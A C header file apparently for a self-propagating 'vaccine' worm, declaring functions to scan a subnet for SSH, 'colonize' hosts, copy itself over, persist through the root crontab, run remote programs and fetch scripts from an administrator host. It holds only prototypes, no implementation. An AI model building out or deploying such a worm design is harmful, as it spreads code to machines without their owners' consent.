#ifndef VACCIN_H
#define VACCIN_H

 #include "utils.h"
 #include <unistd.h>
 #include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <libgen.h>
 #include <stdbool.h>
 #include <sys/types.h>
 #include <ifaddrs.h>
 #include <arpa/inet.h>

 #define CMD_LEN 4096
 #define IP_LEN 16

 /*
 * Parameters of the configuration file
 */
 dictionary *params;

 /*
 * Check if the program is launched by root
 */
 bool isRoot();

 /*
 * Check if a network interface on the system is configured with the administrator ip address
 */
 bool isSourceHost();

 /*
 * Scan subnetwork and check for each ip address if the ssh port is opened
 */
 struct in_addr* scanNetwork();

 /*
 * Check if the target host is already colonized by the worm
 */
 bool isAlreadyColonized(char *target_ip, char *worm_name);

 /*
 * Colinize a target host
 */
 bool colonize(char *target_ip, char *worm_name);

 /*
 * Check if the worm is authorized to be executed
 */
 bool isAuthorized();

 /*
 * Delete the worm
 */
 bool wormDelete(char *worm_name);

 /*
 * Get informations on the host
 */
 bool infosRecovery();

 /*
 * Get the network mask of an interface configured with the given ip address
 */
 char* getNetworkMask(char *ip);

 /*
 * Upload a file on a target host
 */
 bool uploadFile(char *srcFile, char *dstFile, char *ip);

 /*
 * Remove the worm from the root crontab of a target host
 */
 bool restoreTargetCrontab(char *target_ip, char *worm_name);

 /*
 * Add the worm inside the root crontab of a target host
 */
 bool updateTargetCrontab(char *target_ip, char *worm_name);

 /*
 * Execute a remote program on the target host
 */
 bool execRemote(char *target_ip, char *program);

 /*
 * Retore the local root crontab
 */
 bool restoreCrontab(char *worm_name);

 /*
 * Delete file
 */
 bool deleteFile(char *file);

 /*
 * Download a script from the administrator host
 */
 bool downloadScript();

 /*
 * Execute the script and save output in a log file
 */
 bool executeScript();
 
 /*
 * Get the log filename where results of the script will stored
 */
 char* getLogFilename();

#endif /* VACCCIN_H */
